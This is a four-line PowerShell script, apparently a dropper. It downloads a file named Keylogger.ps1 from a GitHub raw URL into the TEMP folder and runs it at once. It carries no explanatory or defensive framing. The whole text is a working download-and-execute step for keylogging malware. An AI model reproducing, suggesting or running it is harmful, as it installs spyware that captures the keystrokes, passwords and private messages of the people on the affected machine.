$scriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/main/Keylogger.ps1"
$localScriptPath = "$env:TEMP\keylogger.ps1"
Invoke-WebRequest -Uri $scriptUrl -OutFile $localScriptPath
& $localScriptPath
